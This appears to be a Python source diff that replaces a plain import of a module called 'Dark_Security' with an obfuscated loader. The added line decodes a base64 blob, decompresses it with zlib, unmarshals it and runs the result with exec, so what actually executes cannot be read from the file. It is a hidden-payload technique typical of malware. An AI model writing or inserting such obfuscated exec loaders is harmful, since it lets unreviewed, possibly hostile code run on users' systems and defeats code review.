@@ -1,2 +1,2 @@
-import Dark_Security
-Dark_Security.run()
+import zlib, marshal, base64
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKD0Zz0gMZUhmCGY0ZuhiCGGIYiJAQMoMZhCWQoM6YyaTC9BTD9Nplu8LolF2fHBqcmlRZkllbeYi0rzVjJ8Bsne4rApLinKzEu3A7Jy81NKc1LtijiAEoxAXCwCJD4wMzIy3mYQucHAe51B8BKD4FUG4SI2oAQAdcsf1g=='))))
